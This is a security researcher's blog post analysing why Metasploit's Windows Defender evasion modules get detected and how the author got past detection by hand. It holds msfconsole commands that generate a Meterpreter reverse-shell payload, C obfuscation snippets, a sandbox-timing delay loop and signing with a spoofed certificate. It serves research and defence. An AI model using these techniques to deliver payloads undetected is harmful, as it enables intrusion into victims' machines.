---
layout: post
date:   2019-01-23 22:00:00 +0200
categories: research
description: "A research on why the new defender evation modules fail to evade and how to fix it manually"
title:  "Beating Windows Defender. Analysis of Metasploit's new evasion modules."
---
# Introduction
Recently my colleague Alexander Tzokev wrote in his blog [tzokev.com](http://www.tzokev.com/) about the new evasion modules in Metasploit v5 and how they fail at their job of... evading. I wanted to analyze the resulting binaries and see if there's something interesting on the assembly level that might be triggering a signature. This research is based on Alexander's post, but because I want it to be stand-alone, I'll have to repeat some of his findings first. 

# Installing Metasploit v5
Rapid7 announced the release of evasion modules in the new major release of Metasploit (v5). Currently there are only 2 such modules available and both are for Windows Defender. Before I started with the analysis I had to get my hands on Metasploit v5, which is quite easy. Clone the git repository and install some dependencies.

```bash
git clone https://github.com/rapid7/metasploit-framework.git
sudo apt update && sudo apt install -y git autoconf build-essential libpcap-dev libpq-dev zlib1g-dev libsqlite3-dev
cd ~/metasploit-framework/
# you need ruby 2.5.3
gem install bundler
bundle install
# if there are error messages use apt-get install to resolve dependencies
```

Working with the evasion modules is also simple:
```
use evasion/windows/windows_defender_exe
set payload windows/meterpreter/reverse_tcp
set lhost 10.0.0.100
# Verbose prints out the C code template
set verbose true
run
```

Or with the following one-liner from terminal:
```bash
./msfconsole -x 'use evasion/windows/windows_defender_exe; set verbose true; set payload windows/meterpreter/reverse_tcp; set LHOST 10.0.0.100; run;quit;'
```

So far so good. But when you transfer the malicious executable to the victim machine you're in for a surprise! Windows Defender detects it, your l33t hacker soul is devastated and you go in the corner to cry... rgiht? Or you could spend some time analysing the root cause for this and maybe fixing the issue :)

# Analysis
First, let's see the source code of the evasion module, to know what to expect in the binary. The path to the module is *metasploit-framework/modules/evasion/windows/windows_defender_exe.rb*{: style="color: LightSalmon"}

![defender_evasion_module.png](images/beating_defender/defender_evasion_module.png)

The module uses RC4 with a random key (*1*{: style="color: Red"}) to encrypt the payload (*2*{: style="color: Red"})(*3*{: style="color: Red"}). The encrypted payload is placed in a C source file template as character buffer (*4*{: style="color: Red"}). The RC4 implementation is inside the rc4.h header file.  The C code allocates memory which will hold the decrypted payload, then uses OpenProcess WinAPI function to bypass the real-time protection and finally decrypts and executes the payload.

The OpenProcess technique is interesting one. Some really smart people with a lot of spare time have reversed the scanning and detection engine of Windows Defender (*C:\ProgramData\Microsoft\Windows Defender\Definition Updates\{GUID}\mpengine.dll*{: style="color: LightSalmon"}). It is a large 14 MB binary with over 40k functions and has emulation capabilities for x86, js, etc. 

![mpengine_disassembly.png](images/beating_defender/mpengine_disassembly.png)

Rapid7 found out that the function responsible for the emulation of OpenProcess always returns 1. Thus in order for malware to detect if it's running inside a sandbox it can use OpenProcess in such a way to make sure that it fails (returns 0). If the malware is in the Defenders sandbox then OpenProcess will return 1, but if it's running in a real environment OpenProcess will return 0. A simple 'if' check is needed to bypass the real-time protection.

The Metasploit module tries to open the System process (PID 4) with PROCESS_ALL_ACCESS (0x1F0FFF) rights, which will certainly fail on a real system.

The C code is compiled with Metasploit::Framework::Compiler::Windows.compile_random_c() method which obfuscates the C code (*5*{: style="color: Red"}). This means that the code shown from the verbose output (the C template) is not the final code! The compilation is done in *metasploit-framework/lib/metasploit/framework/compiler/windows.rb*{: style="color: LightSalmon"}

![metasploit_windows_compiler_01.png](images/beating_defender/metasploit_windows_compiler_01.png)

The method responsible for the actual compilation (compile_c) uses Metasm - a pure ruby C compiler.

![metasploit_windows_compiler_03.png](images/beating_defender/metasploit_windows_compiler_03.png)

To print the actual code after the randomization and right befor compilation, just add puts:

![metasploit_windows_compiler_02.png](images/beating_defender/metasploit_windows_compiler_02.png)

Now when I generate a new executable, the actual C code is printed:

![randomized_c_code.png](images/beating_defender/randomized_c_code.png)

The final code also contains the header files ( at the top you see part of the rc4 implementation). In the blue boxes I highlighted the random pieces of code which the randomizer added.

Before analyzing the evasion binaries I wanted to know how the Metasm compiler works. For the purpose I created a new bare bones module for Metasploit which used Metasm to compile a simple Hello World C program without obfuscation. To create the module I just copied the Defender one to *metasploit-framework/modules/evasion/test/windows_defender_exe.rb*{: style="color: LightSalmon"} and changed it to suit my needs.

![test_evasion_module.png](images/beating_defender/test_evasion_module.png)

![test_evasion_module_run.png](images/beating_defender/test_evasion_module_run.png)

Now let's analyze it :)

One thing you'll notice right away when checking the hexdump is the changed DOS stub string. The strings, libraries and functions are also there in plaintext, not obfuscated.

![hex.png](images/beating_defender/hex.png)

![bintext.png](images/beating_defender/bintext.png)

DIE doesn't detect the Metasm compiler.

![die_01.png](images/beating_defender/die_01.png)

The entropy is quite low, so we can be pretty sure there is no additional packing happening behind the scenes drung compilation.

![die_02.png](images/beating_defender/die_02.png)

If you upload a sample to Hybrid Analysis in results you'll see that the file was accessing registry keys for TerminalServices, but that's just part of the initialization of kernelbase.dll. Below you can see the same behaviour with another non-malicous program.

Procmon result from running bintext:
![procmon_bintext.png](images/beating_defender/procmon_bintext.png)

Procmon result from running Metasploit generated binary:
![procmon_test.png](images/beating_defender/procmon_test.png)

And finally let's look at the dissassembly :)
Below is the result of the static analysis:
![test_dissassembly.png](images/beating_defender/test_dissassembly.png)

There are 3 subroutines - start, get_address and wrap_call_function.

**get_address:**  
The *call $+5*{: style="color: LightGreen"} saves the address of the next instruction on top of stack as the return address (which is *0x401023*{: style="color: LightSalmon"} and corresponds to *pop eax*{: style="color: LightGreen"}), then transfers execution 5 bytes ahead. 

But 5 bytes ahead is the same *pop eax*{: style="color: LightGreen"} instruction (*0x401023*{: style="color: LightSalmon"}), which now pops the return address (*0x401023*{: style="color: LightSalmon"}) into *eax*{: style="color: LightGreen"}.
Finally  *add eax, 0xfffffffb*{: style="color: LightGreen"} is executed (equivalent to substracting 5 from *0x401023*{: style="color: LightSalmon"}), the result of which is the start address of the current function (*0x40101e*{: style="color: LightSalmon"})

So, basically, get_address returns its own address.

**wrap_call_function:**  
*call get_address*{: style="color: LightGreen"} loads *0x40101e*{: style="color: LightSalmon"} (the address of get_address) in eax
and then jumps to address *[eax+0x2fe2]*{: style="color: LightGreen"} (equals to 0x40101e + 0x2fe2 = 0x404000)

At *0x404000*{: style="color: LightSalmon"} is the imported printf function.
![printf.png](images/beating_defender/printf.png)

**start:**  
Loads *0x40101e*{: style="color: LightSalmon"} (the address of get_address) in eax
then adds 0x40101e + 0xfe2 = 0x402000
then pushes *0x402000*{: style="color: LightSalmon"} on stack and calls printf (address 0x404000)

You've probably guessed already that at 0x402000 resides the argument to printf.

![string.png](images/beating_defender/string.png)

So, the Metasm binaries use a function address as a base address to calculate the offsets to constants and imported functions and then uses a second wrapper function to call the imported functions.

The analysis of a complete obfuscated evasion binary didn't reveal anything different.

![disassembly_obfuscated_01.png](images/beating_defender/disassembly_obfuscated_01.png)

![disassembly_obfuscated_02.png](images/beating_defender/disassembly_obfuscated_02.png)

Apart from the Metasm peculiarities, there isn't anything new. Whatever the C code does, thats what you'll find in the assembly. No additional obfuscation, packing or optimization happening behind the scenes. Which means that the C code alone is enough to study the operation of the generated files. 

# Evading Defender

Because mpengine.dll is too big to reverse in a reasonable time, the only viable approach to discover why it gets detected is by manually tweaking the code and note which parts are matched by the signature. It's important to say that this testing was done without internet connection, because Defender has cloud functionality with machine-learning algorithms. Later when I've bypassed the local detection I'll try to bypass the cloud scanning. 

After many many tries making changes to the code like
- removing VirtualAlloc
- removing OpenProcess
- removing the rc4 function & the rc4.h header
- removing the encrypted shellcode
- removing the if(proc == NULL) body  

and various combinations of those, I found that the signatures are based on:
- OpenProcess
- RC4 algorithm
- the payload
- VirtualAlloc
- possibly the unusual compiler

If we assume it's a static signature that's firing (because OpenProcess should bypass real-time protection), then to bypass it we have to obfuscate the code a little more then what Metasploit provides by default. The signature is unlikely to use OpenProcess and VirtuallAlloc alone as detection criteria (would cause too much false positives), so I guess it also checks their arguments along with the presence of other things. To obfuscate them we can write a wrapper function to call them outside main and add additional junk functions which calculate the arguments. That way the values of the arguments would be known only at run-time and can't be inspected statically. 

For example, I wrote a similar code to the one below (I won't release the actual code), every argument and constant has to be "calculated" at runtime, also the function is not called directly, but though a wrapper function with changed order of arguments.
```c
// always returns 0
int zero(int input){
    int i = 85;
    int j = 57;
    for(;i!=0;i-=5){
        if(i==5){
            j=input;
        }
    }
    return i+input-j;
}

// A function which "calculates" the parameter
int valloc_param2(int lpBufSize){
  return lpBufSize-(zero(123)*zero(754));
}

//VirtualAlloc wrapper function
LPVOID wrap_virtualalloc(int param4, int param3, int param2, int param1){
  	LPVOID lpBuf = VirtualAlloc(param1+zero(13), param2-(zero(324)*zero(145)), param3-zero(87), param4+zero(234));
  	return lpBuf;
}

// actual call to the wrapper function
LPVOID lpBuf = wrap_virtualalloc(valloc_param4(234),valloc_param3(),valloc_param2(P_LEN),valloc_param1());
```

The next thing to remove is the RC4 algorithm. I wrote a custom XOR-based encryption algorithm with several transformations of the original shellcode payload. The algorithm isn't necessary to be cryptographically secure (mine is definitely NOT), the only purpose here is obfuscation, not security. With that changed, Defender is unlikely to have a signature to match my algorithm or the encrypted payload. 

Sounds easy, but there was A LOT of trial and error. There are some characters which have to be avoided or they break the ruby script, escaping them didn't work. Also the errors messages don't help at all, 90% I had to guess what was the cause of the problem. At the end I decided to add one final transformation to the payload and make it entirely of printable ASCII characters which also added a nice bonus obfuscation points :)

Let's summarize:
- OpenProcess and VirtAlloc are changed in such a way so it's unlikely a static signature would match
- RC4 algorithm is replaced with a custom one, thus again it's unlikely a static signature would match
- Because the payload is encrypted with the new algorithm it also looks nothing alike the previous one
- The payload is also transformed to printable ASCII characters
- The only thing that remains unchanged is the compiler

I replaced the available C template with my new modified one and generated the obfuscated malicious binary. Downloaded it on the victim machine and ...*drum rolls*...  
SUCCESS! Defender didn't catch it! But my happiness was shortlived, when I ran the file it didn't work...

Turns out I had a bug in my ASCII transform code, so the resulting shellcode after the decryption was just junk bytes. 

![broken_shellcode.gif](images/beating_defender/broken_shellcode.gif)

This mistake was a lucky one and I'm glad I made it, you'll see why in a moment.
After I fixed the bug, Defender caught the malware, not only that but it detected it as Metrepreter!

![fixed_shellcode.gif](images/beating_defender/fixed_shellcode.gif)

The only way for Defender to know my file contains Meterpreter payload to emulate the code, run the decryption routines and get access to the actual shellcode which I generated with msfvenom. But this shouldn't have happend, right? I have the OpenProcess trick implemented, sandbox detection shouldn't be happening!

To test my theory I broke the payload on purpose and generated a dozen files. Non were detected. Did the same with properly working ones - all got detected like Meterpreter. 

If Microsoft changed the behaviour of the emulated version of OpenProcess, then it probably returns either 1 or 0. I changed the condition after OpenProcess to  *if(proc==256)*{: style="color: LightSalmon"} and generated a few more files. None were detected. So it appears that microsoft did indeed changed the behaviour of OpenProcess inside mpengine.dll. It can no longer be used as sandbox detection, because you can't force it to return a predetermined value different from 1 or 0.

![modified_condition.gif](images/beating_defender/modified_condition.gif)

I felt really bad. All this work, manual obfuscation and whatnot was for nothing. I started to think of other ways for sandbox detection which didn't involve reversing of the monstrous mpengine.dll. And decided to try the oldest trick in the book - delay! Add a loop with some stuff in it, which takes sufficiently long time to execute. People wouldn't like to wait 15 minutes for their files to be analyzed, every time they download something from the Internet, so emulation engines usually have a timer. They have to analyze the file in the specified time interval and if the time runs out the emulation stops.

If a sufficiently long loop is added before the malicious code then Defender won't have time to analyze the whole functionality.

A fairly simple loop like the one below did the trick for me:
```c
unsigned long i = 0;
unsigned long j = 0;

while(1){
        if(i>68020500){
		break;
	}
	j+=zero(i++)+five(i)-five(i);
    }
if(i>0 && j!=(6325+zero(34))){
// snip
```
I removed OpenProcess because it's not needed anymore.

![with_timer_loop_exec.gif](images/beating_defender/with_timer_loop_exec.gif)

Execution is successful :) 

But we're not done yet, remember the cloud functionality? When I turned my Internet connection back on, Defender caught the malicious file and marked it as Trojan:Win32/Fuerboos. 

![cloud_detection.PNG](images/beating_defender/cloud_detection.PNG)

This means that the sandbox still didn't pass my loop, outherwise it should have been marked as Meterpreter. The ML algorithms find something else in my file suspicious. 

I decided to sign my executable with a spoofed certificate using the CarbonCopy tool because some AVs don't verify the whole chain of the certificate. And it worked. The only problem now is that when I execute the file Windows detects that it is signed from unknown publisher and warns me that the file origin is "unknown". But no antivirus detections!

![signed.gif](images/beating_defender/signed.gif)


# Further reading
1. [Malware on steroids part 3 - Machine learning sandbox evasion](http://niiconsulting.com/checkmate/2018/12/malware-on-steroids-part-3-machine-learning-sandbox-evasion/)
2. [CarbonCopy Tool](https://github.com/paranoidninja/CarbonCopy)
3. [Metasploit framework encapsulating AV techniques](https://www.rapid7.com/globalassets/_pdfs/whitepaperguide/rapid7-whitepaper-metasploit-framework-encapsulating-av-techniques.pdf)
4. [RECON-BRX-2018 Reverse Engineering Windows Defenders JavaScript Engine](https://recon.cx/2018/brussels/resources/slides/RECON-BRX-2018-Reverse-Engineering-Windows-Defender-s-JavaScript-Engine.pdf)
5. [Blackhat - Windows Offender - Reverse Engineering Windows Defenders Antivirus Emulator](https://i.blackhat.com/us-18/Thu-August-9/us-18-Bulazel-Windows-Offender-Reverse-Engineering-Windows-Defenders-Antivirus-Emulator.pdf)
6. [WindowsDefenderTools](https://github.com/0xAlexei/WindowsDefenderTools)


